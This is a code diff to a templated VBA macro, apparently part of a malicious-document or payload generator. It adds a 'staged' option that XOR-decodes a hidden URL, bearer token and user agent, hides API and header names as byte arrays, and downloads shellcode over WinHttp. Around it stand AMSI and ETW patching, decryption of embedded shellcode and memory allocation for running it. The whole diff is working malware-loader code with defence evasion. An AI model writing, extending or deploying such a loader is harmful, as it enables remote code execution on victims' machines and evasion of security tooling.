@@ -173,6 +173,35 @@ Private Sub {{ v.fn_exec }}()
     Call {{ v.fn_amsi_patch }}
     Call {{ v.fn_etw_patch }}
 
+    {% if is_staged %}
+    Dim {{ sg.sg_lv_url }}_a As Variant, {{ sg.sg_lv_jwt }}_a As Variant, {{ sg.sg_lv_ua }}_a As Variant, {{ sg.sg_lv_i }} As Long
+    {{ sg.sg_lv_url }}_a = Array({% for b in staged_url_enc %}{{ b }}{% if not loop.last %},{% endif %}{% endfor %})
+    {{ sg.sg_lv_jwt }}_a = Array({% for b in staged_jwt_enc %}{{ b }}{% if not loop.last %},{% endif %}{% endfor %})
+    {{ sg.sg_lv_ua }}_a  = Array({% for b in staged_ua_enc %}{{ b }}{% if not loop.last %},{% endif %}{% endfor %})
+    For {{ sg.sg_lv_i }} = 0 To UBound({{ sg.sg_lv_url }}_a): {{ sg.sg_lv_url }}_a({{ sg.sg_lv_i }}) = {{ sg.sg_lv_url }}_a({{ sg.sg_lv_i }}) Xor {{ staged_url_xk }}: Next
+    For {{ sg.sg_lv_i }} = 0 To UBound({{ sg.sg_lv_jwt }}_a): {{ sg.sg_lv_jwt }}_a({{ sg.sg_lv_i }}) = {{ sg.sg_lv_jwt }}_a({{ sg.sg_lv_i }}) Xor {{ staged_jwt_xk }}: Next
+    For {{ sg.sg_lv_i }} = 0 To UBound({{ sg.sg_lv_ua }}_a):  {{ sg.sg_lv_ua }}_a({{ sg.sg_lv_i }})  = {{ sg.sg_lv_ua }}_a({{ sg.sg_lv_i }})  Xor {{ staged_ua_xk }}:  Next
+    Dim {{ sg.sg_lv_url }} As String, {{ sg.sg_lv_jwt }} As String, {{ sg.sg_lv_ua }} As String
+    {{ sg.sg_lv_url }} = {{ v.fn_build_str }}({{ sg.sg_lv_url }}_a)
+    {{ sg.sg_lv_jwt }} = {{ v.fn_build_str }}({{ sg.sg_lv_jwt }}_a)
+    {{ sg.sg_lv_ua }}  = {{ v.fn_build_str }}({{ sg.sg_lv_ua }}_a)
+    Dim {{ sg.sg_lv_req }} As Object
+    On Error Resume Next
+    Set {{ sg.sg_lv_req }} = CreateObject({{ v.fn_build_str }}(Array(87,105,110,72,116,116,112,46,87,105,110,72,116,116,112,82,101,113,117,101,115,116,46,53,46,49)))
+    If Err.Number <> 0 Then Err.Clear: Exit Sub
+    On Error GoTo 0
+    {{ sg.sg_lv_req }}.Open {{ v.fn_build_str }}(Array(71,69,84)), {{ sg.sg_lv_url }}, False
+    {{ sg.sg_lv_req }}.SetRequestHeader {{ v.fn_build_str }}(Array(65,117,116,104,111,114,105,122,97,116,105,111,110)), {{ v.fn_build_str }}(Array(66,101,97,114,101,114,32)) & {{ sg.sg_lv_jwt }}
+    {{ sg.sg_lv_req }}.SetRequestHeader {{ v.fn_build_str }}(Array(85,115,101,114,45,65,103,101,110,116)), {{ sg.sg_lv_ua }}
+    On Error Resume Next
+    {{ sg.sg_lv_req }}.Send
+    If Err.Number <> 0 Then Err.Clear: Exit Sub
+    On Error GoTo 0
+    If {{ sg.sg_lv_req }}.Status <> 200 Then Exit Sub
+    Dim {{ v.vba_lv_sc }}() As Byte
+    {{ v.vba_lv_sc }} = {{ sg.sg_lv_req }}.responseBody
+    For {{ sg.sg_lv_i }} = 0 To UBound({{ sg.sg_lv_jwt }}_a): {{ sg.sg_lv_jwt }}_a({{ sg.sg_lv_i }}) = 0: Next
+    {% else %}
     Dim {{ v.vba_lv_schex }} As String, {{ v.vba_lv_keyhex }} As String
     {{ v.vba_lv_schex }}  = {% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
     {{ v.vba_lv_keyhex }} = {% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
@@ -185,6 +214,7 @@ Private Sub {{ v.fn_exec }}()
     Dim {{ v.vba_lv_raw }}() As Byte, {{ v.vba_lv_sc }}() As Byte
     {{ v.vba_lv_raw }} = {{ v.fn_hex2arr }}({{ v.vba_lv_schex }})
     {{ v.vba_lv_sc }}  = {{ v.fn_xor }}({{ v.vba_lv_raw }}, {{ v.vba_lv_k }})
+    {% endif %}
 
     Dim {{ v.vba_lv_mem }} As LongPtr
     {{ v.vba_lv_mem }} = {{ v.fn_callwp }}({{ v.fn_valloc }}, 0, UBound({{ v.vba_lv_sc }}) + 1, &H3000, &H04)
